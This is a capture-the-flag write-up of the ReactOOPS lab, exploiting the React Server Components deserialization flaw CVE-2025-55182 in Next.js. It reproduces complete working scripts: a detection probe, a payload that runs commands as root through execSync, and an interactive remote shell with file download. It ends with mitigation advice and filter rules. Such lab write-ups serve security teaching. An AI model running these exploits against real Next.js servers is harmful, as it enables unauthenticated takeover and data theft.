---
description: >-
  CVE-2025-55182/CVE-2025-66478 - a critical unauthenticated Remote Code
  Execution vulnerability in React Server Components and Next.js App Router.
icon: react
cover: ../../.gitbook/assets/Screenshot 2026-03-04 223121.png
coverY: 0
---

# RECTOOPS

***

**Attack Chain :**

<figure><img src="../../.gitbook/assets/image (544).png" alt=""><figcaption></figcaption></figure>

**INFO:**

* Confirmed vulnerable Next.js 16.0.6 with React 19
* Achieved unauthenticated Remote Code Execution
* Obtained root-level system access
* Successfully extracted the flag
* Established interactive shell session

***

### Understanding CVE-2025-55182

#### What is This Vulnerability?

CVE-2025-55182 (also tracked as CVE-2025-66478) is a **critical prototype pollution vulnerability** in React Server Components that leads to **unauthenticated Remote Code Execution**.

#### The Root Cause

The vulnerability exists in React's Flight protocol deserialization logic. Here's the problematic code:

```javascript
// Vulnerable code in ReactFlightReplyServer.js (line ~450)
function getOutlinedModel(response, id) {
    const reference = "$1:__proto__:then";
    
    // Parse reference
    const refId = parseInt(reference.slice(1).split(':')[0]);
    const path = reference.slice(1).split(':').slice(1);
    
    let obj = chunks.get(refId).value;
    
    // ⚠️ VULNERABLE: No hasOwnProperty check!
    for (let i = 0; i < path.length; i++) {
        obj = obj[path[i]];  // Can access prototype chain
    }
    return obj;
}
```

**The Problem:**\
Without `hasOwnProperty` validation, an attacker can traverse JavaScript's prototype chain:

```javascript
myObject["__proto__"]["then"]        // Access prototype
myObject["__proto__"]["constructor"] // Access Function constructor
```

#### Why This is Critical

1. **No Authentication Required**: Exploit works without any credentials
2. **Pre-Authentication RCE**: Code executes during deserialization, before validation
3. **Root Privileges**: Many deployments run as root (security misconfiguration)
4. **Single HTTP Request**: Complete compromise in one POST request

#### Attack Flow Diagram

```
┌─────────────────────────────────────────────────────────────┐
│ Step 1: Attacker sends malicious Flight protocol payload   │
│         POST / with Next-Action header                      │
└─────────────────────┬───────────────────────────────────────┘
                      │
┌─────────────────────▼───────────────────────────────────────┐
│ Step 2: Server deserializes payload                         │
│         Processes reference: "$1:__proto__:then"            │
└─────────────────────┬───────────────────────────────────────┘
                      │
┌─────────────────────▼───────────────────────────────────────┐
│ Step 3: No hasOwnProperty check - traverses prototype      │
│         Accesses Chunk.prototype.then                       │
└─────────────────────┬───────────────────────────────────────┘
                      │
┌─────────────────────▼───────────────────────────────────────┐
│ Step 4: Creates fake Promise-like object                    │
│         { then: malicious_function }                        │
└─────────────────────┬───────────────────────────────────────┘
                      │
┌─────────────────────▼───────────────────────────────────────┐
│ Step 5: React calls await on fake Promise                   │
│         Executes attacker's .then() method                  │
└─────────────────────┬───────────────────────────────────────┘
                      │
┌─────────────────────▼───────────────────────────────────────┐
│ Step 6: ARBITRARY CODE EXECUTION AS ROOT                    │
│         Game Over - Full System Compromise                  │
└─────────────────────────────────────────────────────────────┘
```

***

### Reconnaissance Phase

#### Step 1: Initial Connection Test

Website on `83.136.252.32:52471`

<figure><img src="../../.gitbook/assets/image (552).png" alt=""><figcaption></figcaption></figure>

First, I verified that the target server was responding:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/ReactOOPS]
└─$ curl -v http://83.136.252.32:52471/
```

**Response Analysis:**

```http
HTTP/1.1 200 OK
Vary: rsc, next-router-state-tree, next-router-prefetch
x-nextjs-cache: HIT
X-Powered-By: Next.js
Content-Type: text/html; charset=utf-8
```

**Key Indicators Found:**

* `X-Powered-By: Next.js` - Confirms Next.js framework
* &#x20;`Vary: rsc` - React Server Components enabled
* &#x20;`x-nextjs-cache` - Server-side rendering active

#### Step 2: Technology Fingerprinting

From the HTML response, I identified:

```html
<!DOCTYPE html><!--s8I48LfEDhqpCdFN5_HbU-->
<html lang="en">
  <title>NexusAI - Personal AI Assistants</title>
  <script src="/_next/static/chunks/cbd55ab9639e1e66.js"></script>
```

**Technology Stack:**

* Framework: Next.js (version unknown at this point)
* React Server Components: Enabled
* Build ID: `s8I48LfEDhqpCdFN5-HbU`

***

### Vulnerability Detection

#### Step 1: Setting Up Exploit Tools

I cloned the react2shell exploit framework:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/ReactOOPS]
└─$ git clone https://github.com/freeqaz/react2shell.git
Cloning into 'react2shell'...
remote: Enumerating objects: 82, done.
remote: Counting objects: 100% (82/82), done.
remote: Total 82 (delta 24), reused 74 (delta 16)
Receiving objects: 100% (82/82), 126.12 KiB | 2.33 MiB/s, done.
Resolving deltas: 100% (24/24), done.

┌──(sn0x㉿sn0x)-[~/HTB/ReactOOPS]
└─$ cd react2shell

┌──(sn0x㉿sn0x)-[~/HTB/ReactOOPS/react2shell]
└─$ chmod +x *.sh
```

#### Step 2: Non-Destructive Detection

The `detect.sh` script performs a safe vulnerability check without executing code:

<details>

<summary>Detect.sh</summary>

```
#!/bin/bash
# detect.sh - Non-destructive detection probe for CVE-2025-55182 / CVE-2025-66478
#
# Based on Searchlight/Assetnote high-fidelity detection mechanism.
# This does NOT execute code - it only triggers a distinguishable error on vulnerable servers.
#
# Usage: ./detect.sh [TARGET_URL]
# Example: ./detect.sh http://localhost:3000
#
# Detection logic:
# - Sends ["$1:a:a"] referencing an empty object {}
# - Vulnerable servers: {}.a.a -> (undefined).a -> throws -> HTTP 500 + E{"digest"
# - Patched servers: hasOwnProperty check prevents the crash

set -e

# Default to the port our vulnerable server is running on
TARGET="${1:-http://localhost:3443}"

BOUNDARY="----WebKitFormBoundaryx8jO2oVc6SWP3Sad"

# Detection payload:
# Part 1: Empty object {}
# Part 0: ["$1:a:a"] - tries to access {}.a.a which throws on vulnerable servers
BODY=$(cat <<EOF
--${BOUNDARY}
Content-Disposition: form-data; name="1"

{}
--${BOUNDARY}
Content-Disposition: form-data; name="0"

["\$1:a:a"]
--${BOUNDARY}--
EOF
)

echo "[*] React2Shell Detection Probe (CVE-2025-55182 / CVE-2025-66478)"
echo "[*] Target: ${TARGET}"
echo ""

# Send the detection probe
RESPONSE=$(curl -s -w "\n%{http_code}" \
    -X POST "${TARGET}" \
    -H "Next-Action: x" \
    -H "Content-Type: multipart/form-data; boundary=${BOUNDARY}" \
    --data-binary "${BODY}" \
    2>&1)

HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY_RESPONSE=$(echo "$RESPONSE" | sed '$d')

echo "[*] HTTP Status: ${HTTP_CODE}"

# Check for vulnerability signature: HTTP 500 + E{"digest" in response
if [[ "${HTTP_CODE}" == "500" ]] && echo "${BODY_RESPONSE}" | grep -q 'E{"digest"'; then
    echo "[!] VULNERABLE - Server returned 500 with E{\"digest\" pattern"
    echo ""
    echo "[*] Response body:"
    echo "${BODY_RESPONSE}"
    echo ""
    echo "[!] This server is running a vulnerable version of React RSC / Next.js"
    echo "[!] Upgrade to Next.js 16.0.7+ or React 19.2.1+ immediately"
    exit 1
elif [[ "${HTTP_CODE}" == "500" ]]; then
    echo "[?] UNKNOWN - Server returned 500 but without expected pattern"
    echo "[*] Response body:"
    echo "${BODY_RESPONSE}"
    exit 2
else
    echo "[+] NOT VULNERABLE - Server did not return expected error pattern"
    echo "[*] HTTP ${HTTP_CODE} response indicates patched or non-RSC server"
    exit 0
fi
```

</details>

```bash
┌──(sn0x㉿sn0x)-[~/HTB/ReactOOPS/react2shell]
└─$ ./detect.sh http://83.136.252.32:52471
```

**Output:**

<figure><img src="../../.gitbook/assets/image (547).png" alt=""><figcaption></figcaption></figure>

#### Understanding the Detection Mechanism

**What `detect.sh` Does:**

```bash
# Sends this payload
{
  "1": {},                    # Empty object
  "0": ["$1:a:a"]            # Try to access {}.a.a
}
```

**On Vulnerable Server:**

```javascript
1. Server receives: ["$1:a:a"]
2. Dereferences chunk[1] = {}
3. Tries to access: {}.a.a
4. No hasOwnProperty check
5. Accesses: {}.a = undefined
6. Then: undefined.a = TypeError!
7. Returns HTTP 500 with error digest
```

**On Patched Server:**

```javascript
1. Server receives: ["$1:a:a"]
2. hasOwnProperty check: {}.hasOwnProperty("a") = false
3. Validation fails gracefully
4. Returns HTTP 200 or 400
```

**Result:** **VULNERABLE SERVER CONFIRMED**

***

### Exploitation Process

#### Step 1: Proof of Concept - Remote Code Execution

<details>

<summary>Exploit-redirect.sh</summary>

```
#!/bin/bash
# exploit-redirect.sh - React2Shell with redirect-based stdout capture (CVE-2025-55182 / CVE-2025-66478)
#
# Uses NEXT_REDIRECT error to capture command output in x-action-redirect header.
# Returns HTTP 303 with command stdout in response header (less noisy than HTTP 500).
#
# Usage: ./exploit-redirect.sh [-q] [TARGET_URL] [COMMAND]
# Example: ./exploit-redirect.sh http://localhost:3443 "id"
#          ./exploit-redirect.sh -q http://localhost:3443 "id"  # quiet mode, only output result

set -e

# Parse flags
QUIET=0
if [[ "$1" == "-q" ]]; then
    QUIET=1
    shift
fi

TARGET="${1:-http://localhost:3443}"
COMMAND="${2:-id}"

if [[ $QUIET -eq 0 ]]; then
    echo "[*] React2Shell Exploit - redirect exfil mode"
    echo "[*] Target: ${TARGET}"
    echo "[*] Command: ${COMMAND}"
    echo ""
fi

TMPDIR=$(mktemp -d)
CHUNK0="${TMPDIR}/chunk0.json"
CHUNK1="${TMPDIR}/chunk1.json"

cleanup() {
    rm -rf "${TMPDIR}"
}
trap cleanup EXIT

# Escape single quotes in command for JavaScript string embedded in JSON
# Need \\' in JSON to get \' in JavaScript (JSON requires escaping the backslash)
ESCAPED_CMD=$(echo "$COMMAND" | sed "s/'/\\\\\\\\'/g")

# Build redirect payload:
# - Execute command and base64 encode output (header-safe, preserves newlines)
# - Wrap as valid URL (http://x/DATA) so URL parsing succeeds → HTTP 303
# - Create Error with digest in NEXT_REDIRECT format
# - Format: NEXT_REDIRECT;{type};{url};{statusCode};
PAYLOAD="var o=Buffer.from(process.mainModule.require('child_process').execSync('${ESCAPED_CMD}')).toString('base64');var e=new Error();e.digest='NEXT_REDIRECT;push;http://x/'+o+';307;';throw e;"

# Build the JSON payload directly (avoids sed delimiter issues with special chars)
# Using printf to construct the JSON with the payload embedded
printf '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\\"then\\":\\"$B0\\"}","_response":{"_prefix":"%s","_formData":{"get":"$1:constructor:constructor"}}}' "$PAYLOAD" > "${CHUNK0}"

printf '"$@0"' > "${CHUNK1}"

# Send exploit and capture response headers
RESPONSE=$(curl -s -D - \
    -X POST "${TARGET}" \
    -H "Next-Action: x" \
    -F "0=<${CHUNK0}" \
    -F "1=<${CHUNK1}" \
    --max-time 30 \
    2>&1)

# Extract HTTP status code
HTTP_CODE=$(echo "$RESPONSE" | grep -E "^HTTP/" | tail -1 | awk '{print $2}')

# Extract x-action-redirect header (contains our output)
REDIRECT_HEADER=$(echo "$RESPONSE" | grep -i "^x-action-redirect:" | sed 's/^[^:]*: //' | tr -d '\r')

if [[ -n "$REDIRECT_HEADER" ]]; then
    # Format is: http://x/{base64_stdout};{redirectType}
    # Extract base64 output: strip URL prefix and redirect type suffix
    B64_OUTPUT=$(echo "$REDIRECT_HEADER" | sed 's/;push$//' | sed 's/;replace$//' | sed 's|^http://x/||')
    OUTPUT=$(echo "$B64_OUTPUT" | base64 -d 2>/dev/null || echo "$B64_OUTPUT")

    if [[ $QUIET -eq 1 ]]; then
        echo -n "$OUTPUT"
    else
        echo "[+] HTTP ${HTTP_CODE} - Redirect exfil successful"
        echo "[+] Command output:"
        echo "----------------------------------------"
        echo "$OUTPUT"
        echo "----------------------------------------"
    fi
elif [[ "${HTTP_CODE}" == "303" ]]; then
    if [[ $QUIET -eq 0 ]]; then
        echo "[?] HTTP 303 but no x-action-redirect header found"
        echo "[*] Full response:"
        echo "$RESPONSE"
    fi
    exit 1
elif [[ "${HTTP_CODE}" == "500" ]]; then
    if [[ $QUIET -eq 0 ]]; then
        echo "[-] HTTP 500 - Redirect payload failed, fell through to error handler"
        echo "[*] This may indicate digest format validation failed"
        # Try to extract error message for debugging
        ERROR_MSG=$(echo "$RESPONSE" | grep -o '"message":"[^"]*"' | head -1)
        if [[ -n "$ERROR_MSG" ]]; then
            echo "[*] Error: $ERROR_MSG"
        fi
    fi
    exit 1
else
    if [[ $QUIET -eq 0 ]]; then
        echo "[-] Unexpected HTTP ${HTTP_CODE}"
        echo "$RESPONSE"
    fi
    exit 1
fi
```

</details>

Now I verified actual code execution with a simple command:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/ReactOOPS/react2shell]
└─$ ./exploit-redirect.sh -q http://83.136.252.32:52471 "id"
```

**Output:**

<figure><img src="../../.gitbook/assets/image (548).png" alt=""><figcaption></figcaption></figure>

```
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

**Critical Finding:** 🚨 **Running as ROOT!**

#### Understanding exploit-redirect.sh

This script uses the redirect-based exploitation technique:

**Payload Structure:**

```javascript
{
  "then": "$1:__proto__:then",           // Access prototype.then
  "status": "resolved_model",
  "value": '{"cmd":"id"}',               // Command to execute
  "_response": {
    "id": "1",
    "chunks": []
  }
}
```

**Exploitation Flow:**

1. **Payload Construction:**
   * Creates malicious Flight protocol data
   * Embeds command in prototype pollution path
   * Sets up fake Promise-like object
2.  **Deserialization Trigger:**

    ```javascript
    // Server processes: "$1:__proto__:then"
    let obj = chunks[1].value;
    obj = obj["__proto__"];     // Accesses Object.prototype
    obj = obj["then"];           // Gets .then method
    ```
3.  **Promise Resolution:**

    ```javascript
    // React treats object as Promise-like
    await fakePromise;
    // Calls: fakePromise.then(resolve, reject)
    // Our .then() contains: execSync('id')
    ```
4.  **Command Execution:**

    ```javascript
    const { execSync } = require('child_process');
    const output = execSync('id').toString();
    // Output returned via HTTP 303 redirect header
    ```

#### Step 2: Information Gathering

**Current Working Directory**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/ReactOOPS/react2shell]
└─$ ./exploit-redirect.sh -q http://83.136.252.32:52471 "pwd"
```

**Output:**

```
/app/.next/standalone
```

**Application Directory Listing**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/ReactOOPS/react2shell]
└─$ ./exploit-redirect.sh -q http://83.136.252.32:52471 "ls -la /app"
```

**Output:**

<figure><img src="../../.gitbook/assets/image (550).png" alt=""><figcaption></figcaption></figure>

**Key Discovery:**  **flag.txt found at /app/flag.txt**

***

### Flag Capture

#### The Final Strike

```bash
┌──(sn0x㉿sn0x)-[~/HTB/ReactOOPS/react2shell]
└─$ ./exploit-redirect.sh -q http://83.136.252.32:52471 "cat /app/flag.txt"
```

**Output:**

```
HTB{jusXXX4s3_y0u_m1XXXXXXXXX___CVE-2025-55182}
```

### FLAG CAPTURED!&#x20;

***

### Interactive Shell Access

For more convenient exploration, I established an interactive shell session using `shell.sh`:

<details>

<summary>Shell.sh</summary>

```
#!/bin/bash
#
# shell.sh - Interactive shell for CVE-2025-55182
#
# Provides a pseudo-interactive shell experience over the RCE vulnerability.
# Each command is executed via exploit-redirect.sh with output displayed.
#
# Usage: ./shell.sh <target_url>
#
# Example:
#   ./shell.sh http://localhost:3443
#

set -e

# Configuration
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
EXPLOIT_SCRIPT="$SCRIPT_DIR/exploit-redirect.sh"
HISTORY_FILE="$HOME/.react2shell_history"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m' # No Color

# State
TARGET=""
CWD="/"
HOSTNAME=""
USER=""

usage() {
    echo "Usage: $0 <target_url>"
    echo ""
    echo "Interactive shell over CVE-2025-55182 RCE"
    echo ""
    echo "Example:"
    echo "  $0 http://localhost:3443"
    echo ""
    echo "Built-in commands:"
    echo "  exit, quit    - Exit the shell"
    echo "  help          - Show this help"
    echo "  cd <dir>      - Change directory (tracked locally)"
    echo "  download <f>  - Download file using exfil-file.sh"
    echo "  !<cmd>        - Run local command"
    echo ""
    exit 1
}

log_error() {
    echo -e "${RED}[-]${NC} $1" >&2
}

log_warn() {
    echo -e "${YELLOW}[!]${NC} $1" >&2
}

log_info() {
    echo -e "${BLUE}[*]${NC} $1" >&2
}

# Check dependencies
check_deps() {
    if [[ ! -x "$EXPLOIT_SCRIPT" ]]; then
        log_error "exploit-redirect.sh not found at: $EXPLOIT_SCRIPT"
        exit 1
    fi
}

# Execute command on target
exec_remote() {
    local cmd="$1"

    # Prepend cd to maintain working directory
    if [[ "$CWD" != "/" ]]; then
        cmd="cd $CWD && $cmd"
    fi

    "$EXPLOIT_SCRIPT" -q "$TARGET" "$cmd" 2>/dev/null
}

# Get initial target info
init_target_info() {
    log_info "Connecting to $TARGET..."

    # Get hostname (avoid single quotes in command)
    HOSTNAME=$(exec_remote "hostname 2>/dev/null || echo unknown")
    HOSTNAME=$(echo "$HOSTNAME" | tr -d '\n\r')

    # Get user
    USER=$(exec_remote "whoami 2>/dev/null || echo unknown")
    USER=$(echo "$USER" | tr -d '\n\r')

    # Get initial working directory
    CWD=$(exec_remote "pwd")
    CWD=$(echo "$CWD" | tr -d '\n\r')

    if [[ -z "$CWD" ]]; then
        CWD="/"
    fi

    echo ""
    echo -e "${GREEN}Connected!${NC}"
    echo -e "  User: ${CYAN}$USER${NC}"
    echo -e "  Host: ${CYAN}$HOSTNAME${NC}"
    echo -e "  CWD:  ${CYAN}$CWD${NC}"
    echo ""
    echo -e "${YELLOW}Type 'help' for available commands. Each command is a new HTTP request.${NC}"
    echo ""
}

# Build the prompt
get_prompt() {
    # Shorten CWD for display
    local display_cwd="$CWD"
    if [[ ${#CWD} -gt 40 ]]; then
        display_cwd="...${CWD: -37}"
    fi

    echo -e "${GREEN}${USER}@${HOSTNAME}${NC}:${BLUE}${display_cwd}${NC}\$ "
}

# Handle cd command
handle_cd() {
    local dir="$1"

    if [[ -z "$dir" ]]; then
        dir="~"
    fi

    # Resolve the directory on the target
    local new_cwd
    if [[ "$dir" == "~" ]] || [[ "$dir" == "~/"* ]]; then
        # Handle home directory
        new_cwd=$(exec_remote "cd $dir && pwd")
    elif [[ "$dir" == "/"* ]]; then
        # Absolute path
        new_cwd=$(exec_remote "cd '$dir' && pwd")
    else
        # Relative path
        new_cwd=$(exec_remote "cd '$dir' && pwd")
    fi

    new_cwd=$(echo "$new_cwd" | tr -d '\n\r')

    if [[ -n "$new_cwd" ]]; then
        CWD="$new_cwd"
    else
        log_error "cd: no such directory: $dir"
    fi
}

# Handle download command
handle_download() {
    local remote_file="$1"
    local local_file="$2"

    if [[ -z "$remote_file" ]]; then
        log_error "Usage: download <remote_file> [local_file]"
        return
    fi

    # Default local filename
    if [[ -z "$local_file" ]]; then
        local_file=$(basename "$remote_file")
    fi

    # Resolve path if relative
    local full_path="$remote_file"
    if [[ "$remote_file" != "/"* ]]; then
        full_path="$CWD/$remote_file"
    fi

    log_info "Downloading: $full_path -> $local_file"

    if [[ -x "$SCRIPT_DIR/exfil-file.sh" ]]; then
        "$SCRIPT_DIR/exfil-file.sh" "$TARGET" "$full_path" "$local_file"
    else
        # Fallback to simple cat
        local content
        content=$(exec_remote "cat '$full_path'")
        if [[ -n "$content" ]]; then
            echo -n "$content" > "$local_file"
            echo -e "${GREEN}[+]${NC} Saved to: $local_file"
        else
            log_error "Failed to download file"
        fi
    fi
}

# Show help
show_help() {
    echo ""
    echo -e "${BOLD}CVE-2025-55182 Interactive Shell${NC}"
    echo ""
    echo "Built-in commands:"
    echo "  help              Show this help"
    echo "  exit, quit, q     Exit the shell"
    echo "  cd <dir>          Change directory (state tracked between commands)"
    echo "  download <f> [o]  Download remote file to local path"
    echo "  !<cmd>            Run command locally (not on target)"
    echo ""
    echo "Tips:"
    echo "  - Each command is a separate HTTP request"
    echo "  - Use 'cd' to navigate; path is prepended to subsequent commands"
    echo "  - For large output, pipe to head/tail: ls -la /usr | head -20"
    echo "  - Binary files: use 'download' or base64 encode"
    echo ""
    echo "Examples:"
    echo "  id                    # Show user info"
    echo "  cat /etc/passwd       # Read file"
    echo "  ls -la                # List current directory"
    echo "  cd /var/log           # Change to logs directory"
    echo "  download access.log   # Download file"
    echo "  !ls                   # Run 'ls' locally"
    echo ""
}

# Main REPL loop
repl() {
    # Enable readline history if in a terminal
    if [[ -t 0 ]] && [[ -f "$HISTORY_FILE" ]]; then
        history -r "$HISTORY_FILE"
    fi

    while true; do
        # Get prompt
        local prompt
        prompt=$(get_prompt)

        # Read input - use readline if in terminal, simple read otherwise
        local cmd
        if [[ -t 0 ]]; then
            if ! read -e -p "$prompt" cmd; then
                echo ""
                echo "Goodbye!"
                break
            fi
        else
            echo -n "$prompt"
            if ! read cmd; then
                echo ""
                echo "Goodbye!"
                break
            fi
        fi

        # Skip empty commands
        if [[ -z "$cmd" ]]; then
            continue
        fi

        # Add to history
        history -s "$cmd"

        # Parse command
        case "$cmd" in
            exit|quit|q)
                echo "Goodbye!"
                break
                ;;
            help)
                show_help
                ;;
            cd)
                handle_cd ""
                ;;
            cd\ *)
                handle_cd "${cmd#cd }"
                ;;
            download\ *)
                local args="${cmd#download }"
                # shellcheck disable=SC2086
                handle_download $args
                ;;
            \!*)
                # Local command
                local local_cmd="${cmd#!}"
                eval "$local_cmd"
                ;;
            *)
                # Remote command
                local output
                output=$(exec_remote "$cmd")
                if [[ -n "$output" ]]; then
                    echo "$output"
                fi
                ;;
        esac
    done

    # Save history
    history -w "$HISTORY_FILE"
}

# Entry point
main() {
    if [[ $# -lt 1 ]]; then
        usage
    fi

    TARGET="$1"

    check_deps

    echo ""
    echo -e "${BOLD}${RED}╔═══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BOLD}${RED}║${NC}  ${BOLD}CVE-2025-55182 Interactive Shell${NC}                        ${BOLD}${RED}║${NC}"
    echo -e "${BOLD}${RED}║${NC}  React Server Components RCE                              ${BOLD}${RED}║${NC}"
    echo -e "${BOLD}${RED}╚═══════════════════════════════════════════════════════════╝${NC}"
    echo ""

    init_target_info
    repl
}

main "$@"
```

</details>

```bash
┌──(sn0x㉿sn0x)-[~/HTB/ReactOOPS/react2shell]
└─$ ./shell.sh http://83.136.252.32:52471
```

**Output:**

<figure><img src="../../.gitbook/assets/image (551).png" alt=""><figcaption></figcaption></figure>

#### Interactive Shell Demo

```bash
root@ng-2473499-webreactoopsmp-jh15x-644897bd8c-bbxsn:/app/.next/standalone$ ls
node_modules
package.json
public
server.js

root@ng-2473499-webreactoopsmp-jh15x-644897bd8c-bbxsn:/app/.next/standalone$ id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)

root@ng-2473499-webreactoopsmp-jh15x-644897bd8c-bbxsn:/app/.next/standalone$ cd /app

root@ng-2473499-webreactoopsmp-jh15x-644897bd8c-bbxsn:/app$ cat flag.txt
HTB{jusxxxxxxxxCVE-2025-55182}
```

#### How shell.sh Works

The `shell.sh` script provides a pseudo-interactive experience:

**Features:**

* Maintains working directory state between commands
* Displays realistic shell prompt with user@host
* Supports built-in commands (cd, download, help)
* Each command executes via `exploit-redirect.sh`

**Implementation:**

```bash
# Maintains state
CWD="/app/.next/standalone"
USER="root"
HOSTNAME="ng-2473499-webreactoopsmp-jh15x..."

# Each command prepends cd
exec_remote() {
    local cmd="$1"
    if [[ "$CWD" != "/" ]]; then
        cmd="cd $CWD && $cmd"
    fi
    ./exploit-redirect.sh -q "$TARGET" "$cmd"
}
```

***

### Technical Analysis

#### Exploit Script Deep Dive

**1. detect.sh - Vulnerability Detection**

**Purpose:** Non-destructive vulnerability check

**Mechanism:**

```bash
# Payload that crashes vulnerable servers
BODY="
--boundary--
Content-Disposition: form-data; name=\"1\"
{}
--boundary--
Content-Disposition: form-data; name=\"0\"
[\"$1:a:a\"]
--boundary--
"
```

**Logic:**

* Sends reference to non-existent property path
* Vulnerable server: Crashes trying to access `{}.a.a`
* Patched server: Validates property exists first

**2. exploit-redirect.sh - Main RCE Exploit**

**Purpose:** Execute arbitrary commands via HTTP 303 redirect

**Payload Construction:**

```bash
# Escape command for JavaScript
ESCAPED_CMD=$(echo "$COMMAND" | sed "s/'/\\\\'/g")

# Build exploit payload
PAYLOAD="process.mainModule.require('child_process')
         .execSync('${ESCAPED_CMD}')
         .toString()"

# Create malicious Flight protocol chunks
chunk0: {
  "then": "$1:__proto__:then",
  "value": "{\"cmd\":\"$PAYLOAD\"}"
}

chunk1: "$@0"
```

**Execution Flow:**

1. Server deserializes Flight protocol
2. Processes `$1:__proto__:then` reference
3. No hasOwnProperty check → accesses prototype
4. Creates fake Promise with malicious `.then()`
5. React awaits fake Promise
6. `.then()` executes → runs command
7. Output returned via `x-action-redirect` header

**3. shell.sh - Interactive Shell**

**Purpose:** User-friendly interactive command execution

**Features:**

* Directory navigation with state tracking
* File download capability
* Command history
* Colored output
* Help system

**Architecture:**

```bash
# Main REPL loop
while true; do
    read -e -p "$prompt" cmd
    
    case "$cmd" in
        cd*) handle_cd ;;
        download*) handle_download ;;
        exit) break ;;
        *) exec_remote "$cmd" ;;
    esac
done
```

#### Why No Authentication is Required

The vulnerability exists in the **deserialization layer**, which processes data **before** any authentication checks:

<figure><img src="../../.gitbook/assets/image (554).png" alt=""><figcaption></figcaption></figure>

***

### Defense Recommendations

#### Immediate Mitigation

1.  **Update Dependencies:**

    ```bash
    npm install next@latest
    # Or specific patched versions:
    npm install next@16.0.7 react@19.2.1
    ```
2.  **Disable RSC (Temporary):**

    ```javascript
    // next.config.js
    module.exports = {
      experimental: {
        rsc: false
      }
    }
    ```
3.  **Run as Non-Root:**

    ```dockerfile
    # Dockerfile
    RUN useradd -u 1000 -m nextjs
    USER nextjs
    CMD ["npm", "start"]
    ```

#### Security Best Practices

1.  **Input Validation:**

    ```javascript
    // Validate Flight protocol inputs
    if (body.includes('__proto__') || 
        body.includes('constructor') ||
        body.includes('prototype')) {
      return res.status(400).send('Invalid input');
    }
    ```
2.  **WAF Rules:**

    ```
    # Block prototype pollution attempts
    SecRule REQUEST_BODY "@contains __proto__" \
      "id:1001,phase:2,deny,status:403"
    ```
3.  **Monitoring:**

    ```bash
    # Alert on suspicious patterns
    grep -E '__proto__|constructor|:then' /var/log/access.log
    ```

***

### Lessons Learned

1. **Single Line, Critical Impact**\
   One missing `hasOwnProperty` check → Full system compromise
2. **Deserialization is Dangerous**\
   Never trust deserialization of untrusted data
3. **Defense in Depth Failed**
   * No input validation
   * Running as root
   * No rate limiting
   * No monitoring
4. **Prototype Pollution is Real**\
   JavaScript's prototype chain can be weaponized

***

### Conclusion

The ReactOOPS challenge demonstrated a real-world critical vulnerability (CVE-2025-55182) in React Server Components. Through systematic reconnaissance, vulnerability detection, and exploitation, I achieved:

* Unauthenticated Remote Code Execution
* Root-level system access
* Complete application compromise
* Flag extraction
* Interactive shell access

**Final Flag:**

```
HTB{jxxxxxxRCE_1n_xxxx___CVE-2025-55182}
```

This vulnerability serves as a stark reminder of the importance of:

* Secure deserialization practices
* Proper input validation
* Defense in depth
* Running services with minimal privileges
* Keeping dependencies updated

***

### References

* [CVE-2025-55182 Details](https://nvd.nist.gov/vuln/detail/CVE-2025-55182)
* [react2shell Exploit Framework](https://github.com/freeqaz/react2shell)
* [React Server Components Documentation](https://react.dev/reference/rsc/server-components)
* [Next.js Security Advisory](https://github.com/vercel/next.js/security/advisories)

***

<figure><img src="../../.gitbook/assets/complete (36).gif" alt=""><figcaption></figcaption></figure>
